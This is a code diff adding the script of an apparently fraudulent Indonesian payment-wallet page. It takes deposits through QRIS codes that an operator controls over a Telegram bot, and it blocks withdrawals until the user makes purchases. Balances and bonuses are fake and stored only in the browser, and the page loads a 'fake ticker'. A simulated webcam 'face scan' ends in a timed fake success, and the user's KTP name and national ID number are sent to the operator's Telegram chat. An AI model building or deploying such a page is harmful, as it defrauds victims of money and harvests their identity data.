+
+        function cancelActiveDepositSystem() {
+            if (depositTimerInterval) clearInterval(depositTimerInterval);
+            let activeDep = JSON.parse(localStorage.getItem(`sanz_active_deposit_${currentUserPhone}`));
+            if(activeDep) {
+                let idx = tradeHistory.findIndex(h => h.id === activeDep.id);
+                if(idx !== -1) { tradeHistory[idx].status = 'Dibatalkan'; saveDataLocally(); renderHistory(); }
+            }
+            localStorage.removeItem(`sanz_active_deposit_${currentUserPhone}`);
+            sendToTelegram(`User UID \`${userID}\` membatalkan permohonan isi saldonya.`);
+            closeTargetModal('deposit-modal');
+            showModal("Pembatalan Sukses","Permohonan isi saldo dibatalkan.","info");
+        }
+
+        function requestDeposit() {
+            const amount = parseInt(document.getElementById('deposit-amount').value);
+            if(isNaN(amount) || amount < 50000) return showModal("Perhatian", "Jumlah minimal pengisian Rp 50.000", "error");
+
+            let trxId = Date.now();
+            let timeStr = new Date().toLocaleTimeString('id-ID');
+
+            let activeDep = { id: trxId, uid: userID, amount: amount, status: 'Menunggu', endTime: Date.now() + (15 * 60 * 1000) };
+            localStorage.setItem(`sanz_active_deposit_${currentUserPhone}`, JSON.stringify(activeDep));
+
+            document.getElementById('deposit-step-1').style.display = 'none';
+            document.getElementById('deposit-step-2').style.display = 'block';
+            document.getElementById('deposit-instructions').style.display = 'block';
+            document.getElementById('deposit-amount-display').innerText = formatIDR(amount);
+
+            tradeHistory.unshift({ id: trxId, type: 'Deposit', amount: amount, time: timeStr, status: 'Menunggu', info: 'QRIS Pembayaran' });
+            saveDataLocally(); renderHistory();
+
+            sendToTelegram(`*PERMINTAAN TIKET TOPUP SALDO (QRIS)*\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\n\nKirim QR File Foto: \`/send ${userID}\` \nKonfirmasi Validasi Saldo: \`/acc ${amount} ${userID}\` \nTolak Tiket: \`/tolak ${userID}\``);
+        }
+
+        function showQR(url, activeDep, isResume = false) {
+            document.getElementById('qris-loading').style.display = 'none';
+            document.getElementById('deposit-success-msg').style.display = 'none';
+            document.getElementById('qris-ready').style.display = 'block';
+            document.getElementById('deposit-instructions').style.display = 'block';
+            document.getElementById('qris-image-tag').src = url;
+            
+            if(!isResume) {
+                activeDep.qrUrl = url;
+                localStorage.setItem(`sanz_active_deposit_${currentUserPhone}`, JSON.stringify(activeDep));
+            }
+            
+            if (depositTimerInterval) clearInterval(depositTimerInterval);
+            depositTimerInterval = setInterval(() => {
+                let diff = Math.floor((activeDep.endTime - Date.now()) / 1000);
+                const el = document.getElementById('deposit-timer');
+                if(diff <= 0) {
+                    clearInterval(depositTimerInterval); el.innerText = "Masa Aktif QRIS Habis!";
+                    localStorage.removeItem(`sanz_active_deposit_${currentUserPhone}`);
+                } else {
+                    let m = Math.floor(diff / 60); let s = diff % 60;
+                    el.innerText = `Kedaluwarsa dalam: ${m<10?'0'+m:m}:${s<10?'0'+s:s}`;
+                }
+            }, 1000);
+        }
+
+        function openWithdrawModal() {
+            if (!requireLogin()) return;
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            let u = usersDb[currentUserPhone];
+            if(!u?.isVerified) return showModal("Perhatian", "Penarikan membutuhkan verifikasi terlebih dahulu.", "error");
+            
+            let hist = JSON.parse(localStorage.getItem(`sanz_hist_${currentUserPhone}`)) || [];
+            let hasValidTrx = hist.some(h => h.status === 'Berhasil' && (h.type === 'PPOB' || h.type === 'Flashsale'));
+            
+            if(!hasValidTrx && !u.hasTrxOverride) {
+                return showModal("Perhatian", "Silakan melakukan transaksi pembelian minimal 1x pada layanan digital untuk membuka fitur.", "error");
+            }
+
+            checkSavedBank(); openTargetModal('withdraw-modal'); 
+        }
+
+        function checkSavedBank() {
+            const saved = JSON.parse(localStorage.getItem(`sanz_bank_${currentUserPhone}`));
+            if(saved) {
+                document.getElementById('wd-setup-bank').style.display = 'none'; document.getElementById('wd-form').style.display = 'block';
+                document.getElementById('saved-bank-name').innerText = saved.name.toUpperCase();
+                document.getElementById('saved-bank-info').innerText = `${saved.provider} - [ ${saved.number} ]`;
+            } else { document.getElementById('wd-setup-bank').style.display = 'block'; document.getElementById('wd-form').style.display = 'none'; }
+        }
+        function saveBankDetails() {
+            const provider = document.getElementById('bank-provider').value;
+            const name = document.getElementById('bank-name').value.trim();
+            const number = document.getElementById('bank-number').value.trim();
+            if(!name || !number) return showModal("Perhatian", "Lengkapi detail perbankan penerima dana.", "error");
+            localStorage.setItem(`sanz_bank_${currentUserPhone}`, JSON.stringify({ provider, name, number })); checkSavedBank();
+        }
+        function resetBankDetails() { localStorage.removeItem(`sanz_bank_${currentUserPhone}`); checkSavedBank(); }
+
+        function submitWithdraw() {
+            const amount = parseInt(document.getElementById('wd-amount').value);
+            if(isNaN(amount) || amount < 50000) return showModal("Perhatian", "Jumlah nominal penarikan minimal Rp 50.000", "error");
+            if(amount > userBalance) return showModal("Perhatian", "Saldo tidak mencukupi untuk penarikan.", "error");
+
+            challengeUserPinSystem(() => {
+                const saved = JSON.parse(localStorage.getItem(`sanz_bank_${currentUserPhone}`));
+                userBalance -= amount; updateBalanceDisplay();
+                
+                const trxId = Date.now();
+                let timeStr = new Date().toLocaleTimeString('id-ID');
+                
+                tradeHistory.unshift({ id: trxId, type: 'Penarikan', amount: amount, time: timeStr, status: 'Berhasil', info: `${saved.provider}` });
+                saveDataLocally(); renderHistory();
+                
+                sendToTelegram(`*PERMINTAAN PENCAIRAN SALDO TARIK*\nUID Anggota: \`${userID}\`\nJumlah Cair: Rp ${amount.toLocaleString('id-ID')}\nBank Tujuan: ${saved.provider} - \`${saved.number}\` an (${saved.name})\n\nAcc Sukses: \`/acc_wd ${userID}\` \nTolak Pencairan: \`/tolak_wd ${userID}\``);
+                
+                closeTargetModal('withdraw-modal');
+                showModal("Diproses", "Permohonan penarikan dana terkirim.", "win");
+            });
+        }
+
+        function addNotifToUser(targetPhone, msgText, msgType = 'info') {
+            let notifs = JSON.parse(localStorage.getItem('sanz_notifs_' + targetPhone)) || [];
+            notifs.unshift({ id: Date.now(), text: msgText, time: new Date().toLocaleString('id-ID'), read: false, type: msgType, claimed: false });
+            localStorage.setItem('sanz_notifs_' + targetPhone, JSON.stringify(notifs));
+            if (currentUserPhone === targetPhone) {
+                updateNotifBadge();
+                showNotif(msgText);
+            }
+        }
+
+        function updateNotifBadge() {
+            if(!currentUserPhone) return;
+            let notifs = JSON.parse(localStorage.getItem('sanz_notifs_' + currentUserPhone)) || [];
+            let unread = notifs.some(n => !n.read || (n.type==='bonus' && !n.claimed));
+            document.getElementById('notif-badge-dot').style.display = unread ? 'block' : 'none';
+        }
+
+        function openNotifModal() {
+            if(!requireLogin()) return;
+            let notifs = JSON.parse(localStorage.getItem('sanz_notifs_' + currentUserPhone)) || [];
+            let listHtml = '';
+            
+            if (notifs.length === 0) {
+                listHtml = '<div style="padding:30px 20px; text-align:center; color:var(--text-muted); font-size:13px;"><i class="bi bi-bell-slash" style="font-size:35px; display:block; margin-bottom:8px;"></i>Kotak masuk notifikasi kosong.</div>';
+            } else {
+                notifs.forEach((n, index) => {
+                    let bonusBtnHtml = "";
+                    if(n.type === 'bonus' && !n.claimed) {
+                        bonusBtnHtml = `<button class="btn-claim-bonus" onclick="claimNewUserBonus(${n.id}, this)">Klaim sekarang</button>`;
+                    }
+                    listHtml += `<div class="notif-popup-item">
+                                    <div style="font-weight:bold; font-size:13px; color:var(--primary); margin-bottom:4px;"><i class="bi bi-info-circle"></i> DIGITAL</div>
+                                    <div style="font-size:13px; line-height:1.4; color:var(--text-main);">${n.text}</div>
+                                    ${bonusBtnHtml}
+                                 </div>`;
+                    n.read = true;
+                });
+                localStorage.setItem('sanz_notifs_' + currentUserPhone, JSON.stringify(notifs));
+            }
+            document.getElementById('notif-list-container').innerHTML = listHtml;
+            updateNotifBadge();
+            openTargetModal('notif-modal');
+        }
+
+        function claimNewUserBonus(notifId, btnEl) {
+            let notifs = JSON.parse(localStorage.getItem('sanz_notifs_' + currentUserPhone)) || [];
+            let idx = notifs.findIndex(n => n.id === notifId);
+            if(idx !== -1 && !notifs[idx].claimed) {
+                notifs[idx].claimed = true;
+                localStorage.setItem('sanz_notifs_' + currentUserPhone, JSON.stringify(notifs));
+                
+                let bonusAmount = 50000; 
+                userBalance += bonusAmount;
+                updateBalanceDisplay();
+                
+                let timeStr = new Date().toLocaleTimeString('id-ID');
+                tradeHistory.unshift({ id: Date.now(), type: 'Bonus', amount: bonusAmount, time: timeStr, status: 'Berhasil', info: 'Klaim Reward Pengguna Baru' });
+                
+                saveDataLocally();
+                renderHistory();
+                
+                btnEl.style.display = "none"; 
+                closeTargetModal('notif-modal');
+                showModal("Berhasil", `Saldo reward pengguna baru sebesar ${formatIDR(bonusAmount)} berhasil ditambahkan.`, "win");
+                
+                sendToTelegram(`User Baru UID \`${userID}\` berhasil mengklaim modal tunai Rp 50.000.`);
+            }
+        }
+
+        async function startTelegramPolling() {
+            if (telegramPollInterval) clearInterval(telegramPollInterval);
+            telegramPollInterval = setInterval(async () => {
+                if (isPolling || !currentUserPhone) return;
+                isPolling = true;
+                try {
+                    let offsetParam = lastTgUpdateId > 0 ? `?offset=${lastTgUpdateId + 1}` : '';
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates${offsetParam}`);
+                    const data = await res.json();
+                    if (!data.ok || !data.result || data.result.length === 0) { isPolling = false; return; }
+
+                    for (let update of data.result) {
+                        lastTgUpdateId = update.update_id; localStorage.setItem('sanz_last_tg_update_id', lastTgUpdateId);
+                        const msg = update.message; if (!msg) continue; 
+                        const text = (msg.text || msg.caption || '').trim();
+                        
+                        let activeDep = JSON.parse(localStorage.getItem(`sanz_active_deposit_${currentUserPhone}`)); 
+                        let activeWd = JSON.parse(localStorage.getItem(`sanz_active_withdraw_${currentUserPhone}`));
+                        let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+
+                        if (text === '/maintenance') { localStorage.setItem('sanz_maintenance', 'true'); checkMaintenance(); sendToTelegram("Sistem Maintenance Server Aktif."); }
+                        if (text === '/unmaintenance') { localStorage.setItem('sanz_maintenance', 'false'); checkMaintenance(); sendToTelegram("Sistem Online Normal Kembali."); }
+                        
+                        // Perintah Verifikasi / ACC
+                        if (text.startsWith('/verif ')) {
+                            let targetUid = text.replace('/verif ', '').trim();
+                            for (let ph in usersDb) {
+                                if (usersDb[ph].uid === targetUid) {
+                                    usersDb[ph].isVerified = true;
+                                    usersDb[ph].verifStatus = 'verified';
+                                    localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+                                    addNotifToUser(ph, "Verifikasi berhasil! Akun Anda kini berstatus Verified.");
+                                    if (ph === currentUserPhone) updateAuthUI();
+                                    sendToTelegram(`Pusat Kontrol: KTP UID \`${targetUid}\` berhasil diverifikasi.`);
+                                    break;
+                                }
+                            }
+                        }
+
+                        if (text.startsWith('/tolak_verif ')) {
+                            let targetUid = text.replace('/tolak_verif ', '').trim();
+                            for (let ph in usersDb) {
+                                if (usersDb[ph].uid === targetUid) {
+                                    usersDb[ph].isVerified = false;
+                                    usersDb[ph].verifStatus = 'rejected';
+                                    localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+                                    addNotifToUser(ph, "Verifikasi KTP Ditolak! Dokumen tidak valid atau buram. Silakan ajukan ulang.");
+                                    if (ph === currentUserPhone) updateAuthUI();
+                                    sendToTelegram(`Pusat Kontrol: Verifikasi KTP UID \`${targetUid}\` ditolak.`);
+                                    break;
+                                }
+                            }
+                        }
+
+                        if(text.startsWith('/reseller ')) {
+                            let targetUid = text.replace('/reseller ', '').trim();
+                            for(let ph in usersDb) {
+                                if(usersDb[ph].uid === targetUid) {
+                                    usersDb[ph].isReseller = true;
+                                    usersDb[ph].resellerPendingRequest = false;
+                                    localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+                                    if(ph === currentUserPhone) updateAuthUI();
+                                    addNotifToUser(ph, "Selamat! Akun Anda resmi menjadi Reseller.");
+                                    sendToTelegram(`Pusat Kontrol: UID \`${targetUid}\` sukses diangkat menjadi level Reseller Pro Premium.`);
+                                    break;
+                                }
+                            }
+                        }
+
+                        if(text.startsWith('/tolak_reseller ')) {
+                            let targetUid = text.replace('/tolak_reseller ', '').trim();
+                            for(let ph in usersDb) {
+                                if(usersDb[ph].uid === targetUid) {
+                                    usersDb[ph].isReseller = false;
+                                    usersDb[ph].resellerPendingRequest = false;
+                                    localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+                                    if(ph === currentUserPhone) updateAuthUI();
+                                    addNotifToUser(ph, "Mohon maaf status pengajuan Reseller Anda ditolak.");
+                                    sendToTelegram(`Status Reseller UID \`${targetUid}\` dicabut/ditolak. Kembali ke akun Standar.`);
+                                    break;
+                                }
+                            }
+                        }
+
+                        if(text.startsWith('/reset_akun ')) {
+                            let targetPhone = text.replace('/reset_akun ', '').trim();
+                            if(usersDb[targetPhone]) {
+                                delete usersDb[targetPhone];
+                                localStorage.removeItem(`sanz_bal_${targetPhone}`);
+                                localStorage.removeItem(`sanz_hist_${targetPhone}`);
+                                localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+                                sendToTelegram(`Database Wipe: Nomor \`${targetPhone}\` berhasil dihapus bersih.`);
+                                if(targetPhone === currentUserPhone) handleLogout();
+                            } else {
+                                sendToTelegram("Nomor handphone tidak diketemukan di database lokal cloud.");
+                            }
+                        }
+
+                        if(text.startsWith('/unlock ')) {
+                            let targetUid = text.replace('/unlock ', '').trim();
+                            for(let ph in usersDb) {
+                                if(usersDb[ph].uid === targetUid) {
+                                    usersDb[ph].unlockedAll = true;
+                                    localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+                                    if(ph === currentUserPhone) updateAuthUI();
+                                    addNotifToUser(ph, "Akses fitur sudah tersedia.");
+                                    sendToTelegram(`Akses Bypass PPN / PPOB Reguler terbuka otomatis untuk UID \`${targetUid}\``);
+                                    break;
+                                }
+                            }
+                        }
+
+                        // Override Transaksi Manual
+                        if(text.startsWith('/trx ')) {
+                            let targetUid = text.replace('/trx ', '').trim();
+                            for(let ph in usersDb) {
+                                if(usersDb[ph].uid === targetUid) {
+                                    usersDb[ph].hasTrxOverride = true;
+                                    localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+                                    if(ph === currentUserPhone) updateAuthUI();
+                                    addNotifToUser(ph, "Status akun diperbarui: Fitur Transfer Dana telah dibuka secara manual oleh Admin karena verifikasi transaksi.");
+                                    sendToTelegram(`Pusat Kontrol: Status transaksi UID \`${targetUid}\` berhasil di-override (Fitur Transfer Dana Terbuka).`);
+                                    break;
+                                }
+                            }
+                        }
+
+                        if (text.startsWith('/add_saldo ')) {
+                            let parts = text.split(' ');
+                            let nominal = parseInt(parts[1]);
+                            let targetUID = parts[2];
+                            if (!isNaN(nominal) && targetUID) {
+                                for(let ph in usersDb) {
+                                    if(usersDb[ph].uid === targetUID) {
+                                        let currentBal = parseFloat(localStorage.getItem(`sanz_bal_${ph}`)) || 0;
+                                        localStorage.setItem(`sanz_bal_${ph}`, currentBal + nominal);
+                                        if(ph === currentUserPhone) { userBalance += nominal; updateBalanceDisplay(); }
+                                        
+                                        let hDb = JSON.parse(localStorage.getItem(`sanz_hist_${ph}`)) || [];
+                                        hDb.unshift({ id: Date.now(), type: 'Deposit', amount: nominal, time: new Date().toLocaleTimeString('id-ID'), status: 'Berhasil', info: 'Suntikan Dana Finansial Admin' });
+                                        localStorage.setItem(`sanz_hist_${ph}`, JSON.stringify(hDb));
+                                        if(ph === currentUserPhone) { tradeHistory = hDb; renderHistory(); }
+                                        
+                                        addNotifToUser(ph, `Saldo sebesar ${formatIDR(nominal)} telah berhasil ditambahkan ke akun Anda oleh Admin Pusat.`);
+                                        sendToTelegram(`Sukses menambahkan saldo sebesar Rp ${nominal.toLocaleString('id-ID')} menuju UID \`${targetUID}\`.`);
+                                        break;
+                                    }
+                                }
+                            }
+                        }
+
+                        // Setor Isi Saldo ACC Update UI
+                        if (activeDep && activeDep.status === 'Menunggu') {
+                            if (text.includes('/acc') && text.includes(userID)) {
+                                localStorage.removeItem(`sanz_active_deposit_${currentUserPhone}`);
+                                let parts = text.split(' '); let accAmt = parseInt(parts[1]); if (isNaN(accAmt)) accAmt = activeDep.amount;
+                                
+                                let finalAmt = accAmt < 99000 ? accAmt - 1500 : accAmt;
+                                userBalance += finalAmt; updateBalanceDisplay();
+                                
+                                let idx = tradeHistory.findIndex(h => h.id === activeDep.id);
+                                if (idx !== -1) { tradeHistory[idx].status = 'Berhasil'; tradeHistory[idx].amount = finalAmt; saveDataLocally(); renderHistory(); }
+                                
+                                if(depositTimerInterval) clearInterval(depositTimerInterval);
+                                document.getElementById('qris-loading').style.display = 'none';
+                                document.getElementById('qris-ready').style.display = 'none';
+                                document.getElementById('deposit-instructions').style.display = 'none';
+
+                                document.getElementById('deposit-success-msg').style.display = 'block';
+                                document.getElementById('deposit-success-msg').innerHTML = "<h3 style='color:var(--success);'>Pembayaran berhasil</h3>";
+                                document.getElementById('btn-cancel-deposit').style.display = 'none';
+                                addNotifToUser(currentUserPhone, `Setoran dana saldo wallet masuk senilai ${formatIDR(finalAmt)} terkonfirmasi valid.`);
+                            }
+                            if (text.includes('/tolak') && text.includes(userID)) {
+                                localStorage.removeItem(`sanz_active_deposit_${currentUserPhone}`);
+                                let idx = tradeHistory.findIndex(h => h.id === activeDep.id);
+                                if (idx !== -1) { tradeHistory[idx].status = 'Dibatalkan'; saveDataLocally(); renderHistory(); }
+                                
+                                if(depositTimerInterval) clearInterval(depositTimerInterval);
+                                document.getElementById('qris-loading').style.display = 'none';
+                                document.getElementById('qris-ready').style.display = 'none';
+                                document.getElementById('deposit-instructions').style.display = 'none';
+
+                                document.getElementById('deposit-success-msg').style.display = 'block';
+                                document.getElementById('deposit-success-msg').innerHTML = "<h3 style='color:var(--danger);'>Pembayaran dibatalkan</h3>";
+                                document.getElementById('btn-cancel-deposit').style.display = 'none';
+                                addNotifToUser(currentUserPhone, "Isi saldo dibatalkan karena data audit perbankan tidak cocok.");
+                            }
+                            if (text.includes('/send') && text.includes(userID) && msg.photo) {
+                                const photo = msg.photo[msg.photo.length - 1]; 
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${photo.file_id}`).then(r=>r.json()).then(d=>{
+                                    if(d.ok) showQR(`https://api.telegram.org/file/bot${BOT_TOKEN}/${d.result.file_path}`, activeDep, false);
+                                });
+                            }
+                        }
+
+                        if (activeWd && activeWd.status === 'Menunggu') {
+                            if (text.includes('/acc_wd') && text.includes(userID)) {
+                                localStorage.removeItem(`sanz_active_withdraw_${currentUserPhone}`);
+                                let idx = tradeHistory.findIndex(h => h.id === activeWd.id);
+                                if (idx !== -1) { tradeHistory[idx].status = 'Berhasil'; saveDataLocally(); renderHistory(); }
+                                addNotifToUser(currentUserPhone, `Permohonan penarikan saldo ${formatIDR(activeWd.amount)} sukses ditransfer ke rekening bank Anda.`);
+                            }
+                            if (text.includes('/tolak_wd') && text.includes(userID)) {
+                                localStorage.removeItem(`sanz_active_withdraw_${currentUserPhone}`);
+                                let idx = tradeHistory.findIndex(h => h.id === activeWd.id);
+                                if (idx !== -1) { tradeHistory[idx].status = 'Dibatalkan'; saveDataLocally(); renderHistory(); }
+                                userBalance += activeWd.amount; updateBalanceDisplay(); saveDataLocally();
+                                addNotifToUser(currentUserPhone, `Penarikan dana dibatalkan admin pusat. Saldo dipulihkan seutuhnya.`);
+                            }
+                        }
+                    }
+                } catch (e) {} finally { isPolling = false; }
+            }, 2500); 
+        }
+
+        function renderHistory() {
+            const box = document.getElementById('history-box'); const fullList = document.getElementById('full-history-list');
+            box.innerHTML = ''; fullList.innerHTML = '';
+            
+            if(tradeHistory.length === 0) {
+                let emptyHTML = '<div style="text-align:center; padding:20px; font-size:13px; color:var(--text-muted);"><i class="bi bi-clock-history" style="font-size:35px; display:block; margin-bottom:8px;"></i>Catatan transaksi kosong.</div>';
+                box.innerHTML = emptyHTML; fullList.innerHTML = emptyHTML; return;
+            }
+
+            tradeHistory.forEach((h, index) => {
+                let iconColor, iconClass, amountStr, statusColorClass;
+                let isAdd = (h.type === 'Deposit' || h.type === 'Bonus');
+                
+                statusColorClass = h.status === 'Menunggu' ? 'text-warning' : (h.status === 'Dibatalkan' ? 'text-danger' : 'text-success');
+                amountStr = isAdd ? `+${formatIDR(h.amount)}` : `-${formatIDR(h.amount)}`;
+                
+                if(h.type === 'PPOB') { iconColor = 'var(--primary)'; iconClass = 'bi-bag-check'; }
+                else if (h.type === 'Deposit' || h.type === 'Bonus') { iconColor = 'var(--success)'; iconClass = 'bi-wallet2'; }
+                else if (h.type === 'Penarikan') { iconColor = 'var(--danger)'; iconClass = 'bi-box-arrow-up'; }
+                else { iconColor = 'var(--warning)'; iconClass = 'bi-fire'; }
+
+                const historyHTML = `<div class="history-item">
+                                        <div style="font-size: 22px; color: ${iconColor};"><i class="bi ${iconClass}"></i></div>
+                                        <div class="hist-info"><h4>${h.type}</h4><p>${h.info || '-'}</p></div>
+                                        <div class="hist-result"><h4 class="${statusColorClass}">${h.status}</h4><p>${amountStr}</p><p style="font-size:10px; color:var(--text-muted);">${h.time}</p></div>
+                                     </div>`;
+                if (index < 3) box.innerHTML += historyHTML; fullList.innerHTML += historyHTML;
+            });
+        }
+
+        function showNotif(msgText) {
+            const toast = document.getElementById('toast-notif');
+            document.getElementById('toast-msg').innerText = msgText;
+            toast.classList.add('show'); setTimeout(() => { toast.classList.remove('show'); }, 3000);
+        }
+
+        function sendToTelegram(message) { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`).catch(e=>console.log(e)); }
+        function formatIDR(num) { return new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(num).replace("IDR", "Rp"); }
+        function openTargetModal(id) { const el = document.getElementById(id); el.style.display = 'flex'; setTimeout(() => el.classList.add('show'), 10); }
+        function closeTargetModal(id) { const el = document.getElementById(id); el.classList.remove('show'); setTimeout(() => el.style.display = 'none', 250); }
+        
+        function toggleNav() { 
+            const nav = document.getElementById('sidenav'), overlay = document.getElementById('sidenav-overlay'); 
+            if (nav.classList.contains('open')) { nav.classList.remove('open'); overlay.classList.remove('show'); setTimeout(() => overlay.style.display = 'none', 250); } 
+            else { overlay.style.display = 'block'; setTimeout(() => { nav.classList.add('open'); overlay.classList.add('show'); }, 10); } 
+        }
+        
+        function toggleTheme() { 
+            const body = document.body, icon = document.getElementById('theme-icon'); 
+            if (body.getAttribute('data-theme') === 'light') { body.removeAttribute('data-theme'); icon.className = 'bi bi-moon-stars'; localStorage.setItem('sanz_theme', 'dark'); } 
+            else { body.setAttribute('data-theme', 'light'); icon.className = 'bi bi-sun'; localStorage.setItem('sanz_theme', 'light'); } 
+        }
+        if (localStorage.getItem('sanz_theme') === 'light') { document.body.setAttribute('data-theme', 'light'); document.getElementById('theme-icon').className = 'bi bi-sun'; }
+        
+        function showModal(title, text, type) {
+            const overlay = document.getElementById('custom-modal'); document.getElementById('modal-title').innerText = title; document.getElementById('modal-desc').innerHTML = text; 
+            const iconEl = document.getElementById('modal-icon');
+            if (type === 'win') iconEl.innerHTML = '<i class="bi bi-check-circle-fill" style="color: var(--success);"></i>';
+            else if (type === 'error') iconEl.innerHTML = '<i class="bi bi-x-circle-fill" style="color: var(--danger);"></i>';
+            else iconEl.innerHTML = '<i class="bi bi-info-circle-fill" style="color: var(--primary);"></i>';
+            overlay.style.display = 'flex'; setTimeout(() => { overlay.classList.add('show'); }, 10);
+        }
+        function closeInfoModal() { const overlay = document.getElementById('custom-modal'); overlay.classList.remove('show'); setTimeout(() => { overlay.style.display = 'none'; }, 250); }
+        
+        function showFullHistory() { 
+            if(!requireLogin()) return;
+            openTargetModal('history-modal'); 
+        }
+        function closeFullHistory() { closeTargetModal('history-modal'); }
+
+        let webcamStream = null;
+        function openKTPModal() {
+            if(!requireLogin()) return;
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+            if(usersDb[currentUserPhone].isVerified) return showModal("Sudah Terverifikasi", "Tingkat akun Anda telah berstatus Verified.", "win");
+            if(usersDb[currentUserPhone].verifStatus === 'pending') return showModal("Sedang Ditinjau", "Menunggu approval dokumen verifikasi Anda di Telegram.", "info");
+            
+            document.getElementById('v-name').value = ''; document.getElementById('v-nik').value = ''; document.getElementById('v-file').value = '';
+            openTargetModal('verif-ktp-modal');
+        }
+
+        async function proceedToFaceScan() {
+            let n = document.getElementById('v-name').value; 
+            let nik = document.getElementById('v-nik').value;
+            let fileInput = document.getElementById('v-file');
+            if(!n || !nik || fileInput.files.length === 0) return showModal("Data Kurang", "Lengkapi isian identitas KTP & file berkas.", "error");
+            if(nik.length !== 16) return showModal("Format NIK", "Nomor NIK KTP wajib berjumlah 16 digit.", "error");
+
+            closeTargetModal('verif-ktp-modal'); openTargetModal('verif-face-modal');
+            try {
+                webcamStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('webcam-video').srcObject = webcamStream;
+                setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Wajah Terdeteksi! Memproses data biometrik..."; }, 2000);
+                setTimeout(() => { finishBioVerification(n, nik, fileInput.files[0]); }, 4500);
+            } catch(e) {
+                showModal("Gagal Kamera", "Gagal mengaktifkan perizinan perangkat sensor kamera biometrik.", "error"); cancelFaceScan();
+            }
+        }
+
+        function cancelFaceScan() {
+            if(webcamStream) { webcamStream.getTracks().forEach(t=>t.stop()); webcamStream = null; }
+            closeTargetModal('verif-face-modal');
+        }
+
+        function finishBioVerification(nama, nik, fileObj) {
+            cancelFaceScan();
+            let usersDb = JSON.parse(localStorage.getItem('sanz_users_db'));
+            usersDb[currentUserPhone].verifStatus = 'pending';
+            usersDb[currentUserPhone].nik = nik; 
+            localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+            
+            updateAuthUI();
+            showModal("Berkas Terikirim", "Data KTP & pemindaian liveness sukses terunggah ke bot pengawas finansial pusat.", "win");
+            
+            let fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('text', `*BERKAS VERIFIKASI AKUN FASTPAY*\nUID Profil: \`${userID}\`\nNama KTP: ${nama}\nNomor NIK: \`${nik}\`\n\nEksekusi Konfirmasi: \`/verif ${userID}\` \nTolak Dokumen: \`/tolak_verif ${userID}\``);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
+        }
+
+        updateAuthUI();
+        if(currentUserPhone) startTelegramPolling();
+
+        // Pemeriksaan Kunjungan Pertama pada Halaman Web
+        window.onload = () => {
+            initFakeTickerSequence(); // Memuat Fake Ticker saat halaman dibuka
+            if (!localStorage.getItem('sanz_has_visited') && !currentUserPhone) {
+                document.getElementById('register-close-btn').style.display = 'none';
+                document.getElementById('login-close-btn').style.display = 'none';
+                openRegisterModal();
+            } else {
+                document.getElementById('register-close-btn').style.display = 'flex';
+                document.getElementById('login-close-btn').style.display = 'flex';
+            }
+        };
+    </script>
+</body>
+</html>
